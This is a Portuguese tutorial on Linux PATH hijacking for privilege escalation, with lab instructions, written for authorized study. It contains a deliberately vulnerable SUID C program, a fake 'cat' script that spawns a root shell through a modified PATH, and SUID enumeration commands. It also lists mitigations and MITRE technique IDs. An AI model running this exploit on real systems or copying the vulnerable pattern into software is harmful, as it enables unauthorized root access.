# Linux — PATH Hijacking

> Escalacao quando um binario privilegiado (ex.: SUID) chama um programa **sem caminho absoluto** e herda o `PATH` do atacante.
> Apenas em labs autorizados.

**Credito:** adaptado (MIT) do material HexSec / Leonardo Tamiano — reescrito em portugues.

---

## O que e o PATH?

O `PATH` e uma variavel de ambiente com diretorios separados por `:`. Quando voce digita `ls`, o shell procura `ls` em cada pasta do PATH, na ordem, ate achar o primeiro match.

```bash
echo $PATH
which ls          # mostra o caminho resolvido
type -a ls
```

Exemplo tipico:

```text
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---

## Por que e abusavel?

Se um programa SUID root faz algo como:

```c
system("cat ./archive/01.txt");   // sem /bin/cat
```

o `cat` e resolvido via PATH **em runtime**. Se o atacante controlar o PATH (ou colocar um diretorio gravavel no inicio), o binario privilegiado pode executar o `cat` do atacante.

---

## Lab minimo (exemplo didatico)

### 1. Programa vulneravel (`reader.c`)

```c
/* gcc reader.c -o reader && sudo chown root:root reader && sudo chmod 4755 reader */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char *VALID_FILES[] = { "01.txt", "02.txt" };
int valid_files_count = 2;

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "Uso: %s <arquivo>\n", argv[0]);
    return 1;
  }
  for (int i = 0; i < valid_files_count; i++) {
    if (!strncmp(argv[1], VALID_FILES[i], strlen(VALID_FILES[i]))) {
      char cmd[64] = {0};
      snprintf(cmd, sizeof(cmd), "cat ./archive/%s", argv[1]);
      setuid(0);
      setgid(0);
      system(cmd);
      return 0;
    }
  }
  puts("Arquivo nao permitido.");
  return 1;
}
```

### 2. Estrutura

```bash
mkdir -p archive
echo "segredo" | sudo tee archive/01.txt
gcc reader.c -o reader
sudo chown root:root reader && sudo chmod 4755 reader
```

### 3. Hijack do PATH (lab)

```bash
# "cat" falso no diretorio atual — so em VM de estudo
printf '%s\n' '#!/bin/sh' '/bin/sh' > cat
chmod +x cat
PATH=.:$PATH ./reader 01.txt
# shell com euid root no lab
id
```

**Mitigacao tipica:** usar caminho absoluto (`/bin/cat`), evitar `system()`, dropar privilegios, `secure_path` no sudo.

---

## Enumeracao em engajamento real

```bash
# Binarios SUID
find / -perm -4000 -type f 2>/dev/null

# Strings / ltrace em SUID suspeito (lab)
strings ./reader | grep -E 'system|popen|exec|/bin'
# Procurar chamadas sem path absoluto

# PATH atual e diretorios gravaveis no PATH
echo $PATH
# Pastas world-writable no PATH sao red flags
```

## Relacionado

- [linux_privesc_teoria.md](linux_privesc_teoria.md) — SUID, sudo, cron
- [linux_privesc_modern.md](linux_privesc_modern.md) — vetores recentes

## MITRE

- T1574.007 — Hijack Execution Flow: Path Interception
- T1548 — Abuse Elevation Control Mechanism
